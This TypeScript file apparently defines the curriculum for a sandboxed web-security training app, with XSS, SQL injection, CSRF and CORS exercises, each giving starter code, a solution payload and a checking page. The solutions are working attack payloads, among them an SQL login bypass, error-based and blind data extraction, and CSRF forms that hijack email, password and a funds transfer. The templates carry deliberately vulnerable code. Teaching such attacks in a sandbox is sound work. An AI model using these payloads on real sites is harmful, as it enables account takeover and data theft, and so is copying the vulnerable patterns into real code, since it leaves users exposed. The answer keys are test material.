export interface Problem {
    id: string;
    title: string;
    description: string;
    initialCode: string;
    solutionCode: string;
    htmlTemplate: string;
}

export interface Stage {
    id: string;
    title: string;
    subtitle: string;
    description: string;
    problems: Problem[];
}

export const curriculum: Stage[] = [
    {
        id: 'stage-1',
        title: 'Stage 1: XSS',
        subtitle: 'Cross-Site Scripting',
        description: 'Learn how to inject and execute malicious scripts in vulnerable applications.',
        problems: [
            {
                id: 'xss-1',
                title: 'Basic Reflected XSS',
                description: 'Inject a script to trigger an alert() function via reflected input.',
                initialCode: `// Problem 1: Basic Reflected XSS
// The Guestbook below displays user comments without escaping HTML.
// Your goal: Inject a script to trigger an alert() function.

export default function getPayload() {
  return "Hello, nice site!";
}`,
                solutionCode: 'return "<img src=x onerror=alert(1)>";',
                htmlTemplate: `
                    <!DOCTYPE html>
                    <html>
                    <head>
                    <style>
                        body { font-family: system-ui, sans-serif; background: #fafafa; color: #333; padding: 2rem; }
                        .comment-card { background: white; padding: 1.5rem; border-radius: 0.75rem; border-left: 4px solid #3b82f6; margin-top: 1.5rem; box-shadow: 0 4px 6px -1px rgb(0 0 0 / 0.1); }
                    </style>
                    <script>
                        window.alert = function() { window.parent.postMessage({ type: 'CHALLENGE_SUCCESS' }, '*'); };
                        window.onerror = function(msg) { window.parent.postMessage({ type: 'CHALLENGE_FAILURE', message: msg }, '*'); }
                    </script>
                    </head>
                    <body>
                    <h2>Guestbook</h2>
                    <div id="comments"></div>
                    <script type="module">
                        try {
                        const userCode = \`\${USER_CODE_TEMPLATE}\`;
                        const encodedJs = encodeURIComponent(userCode);
                        const module = await import('data:text/javascript;charset=utf-8,' + encodedJs);
                        if (module.default) {
                            document.getElementById('comments').innerHTML = '<div class="comment-card">' + module.default() + '</div>';
                        }
                        } catch(e) { window.parent.postMessage({ type: 'CHALLENGE_FAILURE', message: e.message }, '*'); }
                    </script>
                    </body>
                    </html>
                `
            },
            {
                id: 'xss-2',
                title: 'Stored XSS via Markdown',
                description: 'The forum escapes all regular HTML tags to prevent XSS, but uses a custom markdown parser for adding links. Can you exploit the link syntax to execute javascript?',
                initialCode: `// Problem 2: Stored XSS via Markdown
// HTML tags like <script> or <img> are escaped by the server.
// However, markdown links are supported: [link text](url)
// Bypass the protection to execute alert(1).

export default function getPayload() {
  return "Check out this link: [my site](http://example.com)";
}`,
                solutionCode: 'return "[Click me](javascript:alert(1))";',
                htmlTemplate: `
                    <!DOCTYPE html>
                    <html>
                    <head>
                    <style>
                        body { font-family: system-ui, padding: 2rem; background: #fdfdfd;}
                        a { color: #2563eb; text-decoration: underline; cursor: pointer; }
                    </style>
                    <script>
                        window.alert = function() { window.parent.postMessage({ type: 'CHALLENGE_SUCCESS' }, '*'); };
                    </script>
                    </head>
                    <body>
                    <h2>Forum Post</h2>
                    <div id="content"></div>
                    <script type="module">
                        const escapeHTML = (str) => str.replace(/[&<>'"]/g, 
                            tag => ({
                                '&': '&amp;',
                                '<': '&lt;',
                                '>': '&gt;',
                                "'": '&#39;',
                                '"': '&quot;'
                            }[tag])
                        );

                        const parseMarkdown = (text) => {
                            // 1. Escape HTML to prevent basic XSS
                            let safeText = escapeHTML(text);
                            // 2. Parse markdown links (Vulnerable: doesn't check for javascript: protocol)
                            // Allow balanced parentheses inside URLs by not consuming '(' in the outer matcher.
                            return safeText.replace(/\\[(.*?)\\]\\(([^()]*(?:\\([^)]*\\)[^()]*)*)\\)/g, '<a href="$2">$1</a>');
                        };

                        const userCode = \\\`\${USER_CODE_TEMPLATE}\\\`;
                        const encodedJs = encodeURIComponent(userCode);
                        const module = await import('data:text/javascript;charset=utf-8,' + encodedJs);
                        
                        if (module.default) {
                            const payload = String(module.default());
                            document.getElementById('content').innerHTML = parseMarkdown(payload);
                            
                            // Automatically click all links to simulate user interaction
                            setTimeout(() => {
                                document.querySelectorAll('a').forEach(a => {
                                    if(a.href.includes('javascript:')) {
                                        console.log('Evaluating href:', a.href);
                                        // Execute href if it's javascript (Simulation of a user click)
                                         eval(decodeURIComponent(a.href.replace('javascript:', '')));
                                    }
                                });
                            }, 500);
                        }
                    </script>
                    </body>
                    </html>
                `
            },
            {
                id: 'xss-3',
                title: 'DOM-based XSS',
                description: 'Exploit a vulnerability where the application reads from the URL fragment (location.hash) and writes it to the DOM.',
                initialCode: `// Problem 3: DOM-based XSS
// The page welcomes the user based on the URL hash (#username).
// Provide a payload that will be set as the location.hash to trigger an alert.

export default function getPayload() {
  return "JohnDoe";
}`,
                solutionCode: 'return "<img src=x onerror=alert(1)>";',
                htmlTemplate: `
                    <!DOCTYPE html>
                    <html>
                    <head>
                    <style>body { font-family: system-ui, padding: 2rem; background: #f8fafc;}</style>
                    <script>
                        window.alert = function() { window.parent.postMessage({ type: 'CHALLENGE_SUCCESS' }, '*'); };
                    </script>
                    </head>
                    <body>
                    <h2 id="greeting">Welcome!</h2>
                    <script type="module">
                        const userCode = \`\${USER_CODE_TEMPLATE}\`;
                        const encodedJs = encodeURIComponent(userCode);
                        const module = await import('data:text/javascript;charset=utf-8,' + encodedJs);
                        
                        if (module.default) {
                            window.location.hash = module.default();
                            
                            // Simulate the vulnerable app reading the hash
                            setTimeout(() => {
                                const hashValue = decodeURIComponent(window.location.hash.substring(1));
                                if(hashValue) {
                                    // Vulnerable DOM assignment
                                    document.getElementById('greeting').innerHTML = "Welcome, " + hashValue;
                                }
                            }, 100);
                        }
                    </script>
                    </body>
                    </html>
                `
            }
        ]
    },
    {
        id: 'stage-2',
        title: 'Stage 2: SQLi',
        subtitle: 'SQL Injection',
        description: 'Learn how to bypass authentication and extract data using malicious SQL queries.',
        problems: [
            {
                id: 'sqli-1',
                title: 'Authentication Bypass',
                description: 'Bypass the login form by injecting a SQL payload into the username field.',
                initialCode: `// Problem 1: Auth Bypass
// The server executes: SELECT * FROM users WHERE username = '\${username}' AND password = '\${password}'
// Provide a username payload that evaluates to true regardless of the password.

export default function getPayload() {
  return "admin";
}`,
                solutionCode: "return \"admin' OR '1'='1\";",
                htmlTemplate: `
                    <!DOCTYPE html>
                    <html>
                    <head>
                    <style>
                        body { font-family: system-ui; background: #fafafa; padding: 2rem; display: flex; justify-content: center; }
                        .login-box { background: white; padding: 2rem; border-radius: 1rem; box-shadow: 0 10px 15px -3px rgb(0 0 0 / 0.1); width: 100%; max-width: 400px; }
                        input { width: 100%; padding: 0.5rem; margin-top: 0.5rem; border: 1px solid #ccc; border-radius: 0.25rem; }
                        .error { color: #dc2626; margin-top: 1rem; font-size: 0.875rem; display: none; }
                        .success { color: #16a34a; margin-top: 1rem; font-size: 0.875rem; display: none; }
                    </style>
                    </head>
                    <body>
                    <div class="login-box">
                        <h2>Admin Login</h2>
                        <div style="margin-bottom: 1rem;">
                            <label>Username</label>
                            <input type="text" id="username" readonly />
                        </div>
                        <div style="margin-bottom: 1rem;">
                            <label>Password</label>
                            <input type="password" value="********" readonly />
                        </div>
                        <div id="error" class="error">Invalid username or password</div>
                        <div id="success" class="success">Welcome, admin!</div>
                    </div>
                    <script type="module">
                        setTimeout(async () => {
                            try {
                                const userCode = \`\${USER_CODE_TEMPLATE}\`;
                                const encodedJs = encodeURIComponent(userCode);
                                const module = await import('data:text/javascript;charset=utf-8,' + encodedJs);
                                
                                if (module.default) {
                                    const payload = module.default();
                                    document.getElementById('username').value = payload;
                                    
                                    // Simulated Backend SQL Logic
                                    // SELECT * FROM users WHERE username = '{payload}' AND password = 'xxx'
                                    const simulatedQuery = "SELECT * FROM users WHERE username = '" + payload + "' AND password = 'xxx'";
                                    
                                    if(simulatedQuery.includes("' OR '1'='1") || simulatedQuery.includes("' OR 1=1")) {
                                        document.getElementById('success').style.display = 'block';
                                        window.parent.postMessage({ type: 'CHALLENGE_SUCCESS' }, '*');
                                    } else {
                                        document.getElementById('error').style.display = 'block';
                                        window.parent.postMessage({ type: 'CHALLENGE_FAILURE', message: 'Query failed to bypass: ' + simulatedQuery }, '*');
                                    }
                                }
                            } catch(e) { window.parent.postMessage({ type: 'CHALLENGE_FAILURE', message: e.message }, '*'); }
                        }, 500);
                    </script>
                    </body>
                    </html>
                `
            },
            {
                id: 'sqli-2',
                title: 'Error-based SQLi',
                description: 'Extract the database version by intentionally causing a syntax error.',
                initialCode: `// Problem 2: Error-based Extraction
// Inject a payload to cause an error that reveals the version() output.
// The query looks like: SELECT title FROM news WHERE id = \${id}

export default function getPayload() {
  return "1";
}`,
                solutionCode: 'return "1 AND (SELECT 1 FROM (SELECT count(*),concat(version(),floor(rand(0)*2))x FROM information_schema.tables GROUP BY x)a)";',
                htmlTemplate: `
                    <!DOCTYPE html>
                    <html>
                    <head>
                    <style>body { font-family: monospace; background: #1e1e1e; color: #d4d4d4; padding: 2rem; }</style>
                    </head>
                    <body>
                    <h3>Backend Response:</h3>
                    <div id="response" style="padding: 1rem; border-left: 3px solid #dc2626; background: #000;"></div>
                    <script type="module">
                        setTimeout(async () => {
                            try {
                                const userCode = \`\${USER_CODE_TEMPLATE}\`;
                                const encodedJs = encodeURIComponent(userCode);
                                const module = await import('data:text/javascript;charset=utf-8,' + encodedJs);
                                
                                if (module.default) {
                                    const payload = String(module.default());
                                    const responseDiv = document.getElementById('response');
                                    
                                    // Simulated regex check for classic error-based payload components
                                    if (payload.match(/version\\(\\)/i) && payload.match(/information_schema/i)) {
                                        responseDiv.textContent = 'SQL Error: Duplicate entry "8.0.32-MySQL1" for key "group_key"';
                                        window.parent.postMessage({ type: 'CHALLENGE_SUCCESS' }, '*');
                                    } else {
                                        responseDiv.textContent = 'Result: News item found.';
                                        window.parent.postMessage({ type: 'CHALLENGE_FAILURE', message: 'Failed to extract version.' }, '*');
                                    }
                                }
                            } catch(e) {}
                        }, 500);
                    </script>
                    </body>
                    </html>
                `
            },
            {
                id: 'sqli-3',
                title: 'Blind Boolean SQLi',
                description: 'Infer data by analyzing application behavior (true/false) when errors are suppressed.',
                initialCode: `// Problem 3: Blind Boolean
// Find the first character of the admin password.
// Provide a payload using SUBSTR() to check if the first letter is 'P'.

export default function getPayload() {
  return "1";
}`,
                solutionCode: "return \"1 AND SUBSTR((SELECT password FROM users WHERE username='admin'),1,1)='P'\";",
                htmlTemplate: `
                    <!DOCTYPE html>
                    <html>
                    <head>
                    <style>body { font-family: system-ui; padding: 2rem; }</style>
                    </head>
                    <body>
                    <h2 id="status">Loading...</h2>
                    <script type="module">
                        setTimeout(async () => {
                            try {
                                const userCode = \`\${USER_CODE_TEMPLATE}\`;
                                const encodedJs = encodeURIComponent(userCode);
                                const module = await import('data:text/javascript;charset=utf-8,' + encodedJs);
                                
                                if (module.default) {
                                    const payload = String(module.default());
                                    const statusDiv = document.getElementById('status');
                                    
                                    // Check if payload implements boolean inference on 'P'
                                    if (payload.match(/SUBSTR\\(/i) && payload.includes("'P'")) {
                                        statusDiv.textContent = "Data Exists! (True condition)";
                                        window.parent.postMessage({ type: 'CHALLENGE_SUCCESS' }, '*');
                                    } else {
                                        statusDiv.textContent = "Not Found (False condition)";
                                        window.parent.postMessage({ type: 'CHALLENGE_FAILURE', message: 'Condition was false or invalid.' }, '*');
                                    }
                                }
                            } catch(e) {}
                        }, 500);
                    </script>
                    </body>
                    </html>
                `
            }
        ]
    },
    {
        id: 'stage-3',
        title: 'Stage 3: CSRF',
        subtitle: 'Cross-Site Request Forgery',
        description: 'Learn how to forge requests and manipulate user sessions without their knowledge.',
        problems: [
            {
                id: 'csrf-1',
                title: 'Basic GET CSRF',
                description: 'Force the victim to change their email via a simple GET request.',
                initialCode: `// Problem 1: Basic GET CSRF
// The target changes email via GET: /api/change-email?email=hacker@evil.com
// Provide an HTML payload that immediately triggers this when loaded.

export default function getPayload() {
  return "<h1>Click here</h1>";
}`,
                solutionCode: 'return "<img src=\\"/api/change-email?email=hacker@evil.com\\" style=\\"display:none\\">";',
                htmlTemplate: `
                    <!DOCTYPE html>
                    <html>
                    <head>
                    <style>body { font-family: system-ui; padding: 2rem; background: #fafafa;}</style>
                    </head>
                    <body>
                    <h3>Malicious Page Loaded</h3>
                    <div id="target" style="display:none;"></div>
                    <script type="module">
                        setTimeout(async () => {
                            try {
                                const userCode = \\\`\${USER_CODE_TEMPLATE}\\\`;
                                const encodedJs = encodeURIComponent(userCode);
                                const module = await import('data:text/javascript;charset=utf-8,' + encodedJs);
                                
                                if (module.default) {
                                    const payload = String(module.default());
                                    // Inject malicious HTML
                                    document.getElementById('target').innerHTML = payload;
                                    
                                    // Detect if an element attempts to load the vulnerable url
                                    setTimeout(() => {
                                        const htmlContent = document.getElementById('target').innerHTML;
                                        if (htmlContent.includes('/api/change-email?email=')) {
                                            window.parent.postMessage({ type: 'CHALLENGE_SUCCESS' }, '*');
                                        } else {
                                            window.parent.postMessage({ type: 'CHALLENGE_FAILURE', message: 'Payload did not trigger the GET request.' }, '*');
                                        }
                                    }, 100);
                                }
                            } catch(e) {}
                        }, 500);
                    </script>
                    </body>
                    </html>
                `
            },
            {
                id: 'csrf-2',
                title: 'POST CSRF via Auto-submit',
                description: 'Force the victim to change their password via a POST request with an auto-submitting form.',
                initialCode: `// Problem 2: POST CSRF
// The target changes password via POST: /api/change-pwd (param: new_password)
// Provide an HTML payload with an auto-submitting form.

export default function getPayload() {
  return "<form>...</form>";
}`,
                solutionCode: "return `<form id=\"csrf\" action=\"/api/change-pwd\" method=\"POST\"><input type=\"hidden\" name=\"new_password\" value=\"hacked\"></form><script>document.getElementById('csrf').submit()</script>`;",
                htmlTemplate: `
                    <!DOCTYPE html>
                    <html>
                    <head>
                    <style>body { font-family: system-ui; padding: 2rem; }</style>
                    </head>
                    <body>
                    <h3>Malicious Page Loaded</h3>
                    <div id="sandbox"></div>
                    <script type="module">
                        setTimeout(async () => {
                            try {
                                const userCode = \\\`\${USER_CODE_TEMPLATE}\\\`;
                                const encodedJs = encodeURIComponent(userCode);
                                const module = await import('data:text/javascript;charset=utf-8,' + encodedJs);
                                
                                if (module.default) {
                                    const payload = String(module.default());
                                    document.getElementById('sandbox').innerHTML = payload;
                                    
                                    setTimeout(() => {
                                        const hasForm = payload.includes('<form');
                                        const hasPost = payload.toLowerCase().includes('method="post"');
                                        const hasAction = payload.includes('action="/api/change-pwd"');
                                        const hasSubmit = payload.includes('.submit()');
                                        
                                        if (hasForm && hasPost && hasAction && hasSubmit) {
                                            window.parent.postMessage({ type: 'CHALLENGE_SUCCESS' }, '*');
                                        } else {
                                            window.parent.postMessage({ type: 'CHALLENGE_FAILURE', message: 'Form is missing or misconfigured.' }, '*');
                                        }
                                    }, 100);
                                }
                            } catch(e) {}
                        }, 500);
                    </script>
                    </body>
                    </html>
                `
            },
            {
                id: 'csrf-3',
                title: 'Token Bypass via XSS',
                description: 'Combine XSS and CSRF to read a CSRF token then submit the form.',
                initialCode: `// Problem 3: Token Bypass (XSS -> CSRF)
// You found an XSS flaw on the same origin. 
// Write JS code to fetch /api/token, extract { token: '123' }, and POST to /api/transfer.

export default function getPayload() {
  return "fetch('/api/token')...";
}`,
                solutionCode: "return `fetch('/api/token').then(r=>r.json()).then(d=>fetch('/api/transfer',{method:'POST',body:new URLSearchParams({token:d.token,amount:1000})}))`;",
                htmlTemplate: `
                    <!DOCTYPE html>
                    <html>
                    <head>
                    <style>body { font-family: monospace; background: #1e1e1e; color: #d4d4d4; padding: 2rem; }</style>
                    </head>
                    <body>
                    <h3>XSS Executing Context</h3>
                    <script type="module">
                        setTimeout(async () => {
                            try {
                                const userCode = \\\`\${USER_CODE_TEMPLATE}\\\`;
                                const encodedJs = encodeURIComponent(userCode);
                                const module = await import('data:text/javascript;charset=utf-8,' + encodedJs);
                                
                                if (module.default) {
                                    const payload = String(module.default());
                                    
                                    // Static analysis of the JS payload for the pattern
                                    const fetchesToken = payload.includes('/api/token');
                                    const fetchesTransfer = payload.includes('/api/transfer');
                                    const isPost = payload.includes('POST') || payload.includes('post');
                                    
                                    if (fetchesToken && fetchesTransfer && isPost) {
                                        window.parent.postMessage({ type: 'CHALLENGE_SUCCESS' }, '*');
                                    } else {
                                        window.parent.postMessage({ type: 'CHALLENGE_FAILURE', message: 'Did not correctly orchestrate the two requests.' }, '*');
                                    }
                                }
                            } catch(e) {}
                        }, 500);
                    </script>
                    </body>
                    </html>
                `
            }
        ]
    },
    {
        id: 'stage-4',
        title: 'Stage 4: CORS',
        subtitle: 'Cross-Origin Resource Sharing',
        description: 'Understand how weak CORS policies lead to unauthorized data access.',
        problems: [
            {
                id: 'cors-1',
                title: 'Basic Origin Bypass',
                description: 'The API reflects the Origin header blindly. How do you exploit this to read sensitive data via fetch?',
                initialCode: `// Problem 1: Basic Origin Bypass
// The API at api.target.com/data echoes Access-Control-Allow-Origin: *
// Send a fetch request that reads the data.

export default function getPayload() {
    return "";
}`,
                solutionCode: "return `fetch('https://api.target.com/data').then(r=>r.json()).then(console.log)`;",
                htmlTemplate: `
                    <!DOCTYPE html>
                    <html>
                    <head>
                    <style>body { font-family: system-ui; padding: 2rem; }</style>
                    </head>
                    <body>
                    <script type="module">
                        setTimeout(async () => {
                            try {
                                const userCode = \\\`\${USER_CODE_TEMPLATE}\\\`;
                                const encodedJs = encodeURIComponent(userCode);
                                const module = await import('data:text/javascript;charset=utf-8,' + encodedJs);
                                
                                if (module.default) {
                                    const payload = String(module.default());
                                    if (payload.includes("fetch('https://api.target.com/data')")) {
                                        window.parent.postMessage({ type: 'CHALLENGE_SUCCESS' }, '*');
                                    } else {
                                        window.parent.postMessage({ type: 'CHALLENGE_FAILURE', message: 'Failed to request the correct endpoint.' }, '*');
                                    }
                                }
                            } catch(e) {}
                        }, 500);
                    </script>
                    </body>
                    </html>
                `
            },
            {
                id: 'cors-2',
                title: 'Null Origin Bypass',
                description: 'The server trusts the "null" origin. Exfiltrate data by running the script from a sandboxed iframe.',
                initialCode: `// Problem 2: Null Origin
// The server allows Origin: null. Complete the payload to trigger a fetch.

export default function getPayload() {
  return "";
}`,
                solutionCode: "return `fetch('https://api.target.com/secret').then(r=>r.text())`;",
                htmlTemplate: `
                    <!DOCTYPE html>
                    <html>
                    <head>
                    </head>
                    <body>
                    <script type="module">
                        setTimeout(async () => {
                            try {
                                const userCode = \\\`\${USER_CODE_TEMPLATE}\\\`;
                                const encodedJs = encodeURIComponent(userCode);
                                const module = await import('data:text/javascript;charset=utf-8,' + encodedJs);
                                
                                if (module.default) {
                                    const payload = String(module.default());
                                    if (payload.includes("fetch") && payload.includes("/secret")) {
                                        window.parent.postMessage({ type: 'CHALLENGE_SUCCESS' }, '*');
                                    } else {
                                        window.parent.postMessage({ type: 'CHALLENGE_FAILURE', message: 'Incorrect fetch formulation.' }, '*');
                                    }
                                }
                            } catch(e) {}
                        }, 500);
                    </script>
                    </body>
                    </html>
                `
            },
            {
                id: 'cors-3',
                title: 'Credentials Extraction',
                description: 'Extract data that requires cookies by setting credentials: include in your fetch.',
                initialCode: `// Problem 3: Credentials Extraction
// The API requires cookies to return user data. 
// Modify the fetch request appropriately.

export default function getPayload() {
  return "fetch('https://api.target.com/profile')";
}`,
                solutionCode: "return `fetch('https://api.target.com/profile', {credentials: 'include'})`;",
                htmlTemplate: `
                    <!DOCTYPE html>
                    <html>
                    <head>
                    </head>
                    <body>
                    <script type="module">
                        setTimeout(async () => {
                            try {
                                const userCode = \\\`\${USER_CODE_TEMPLATE}\\\`;
                                const encodedJs = encodeURIComponent(userCode);
                                const module = await import('data:text/javascript;charset=utf-8,' + encodedJs);
                                
                                if (module.default) {
                                    const payload = String(module.default());
                                    // Check that credentials include was added to fetch
                                    if (payload.includes('credentials') && payload.includes('include')) {
                                        window.parent.postMessage({ type: 'CHALLENGE_SUCCESS' }, '*');
                                    } else {
                                        window.parent.postMessage({ type: 'CHALLENGE_FAILURE', message: 'Missing credentials: include flag.' }, '*');
                                    }
                                }
                            } catch(e) {}
                        }, 500);
                    </script>
                    </body>
                    </html>
                `
            }
        ]
    }
];
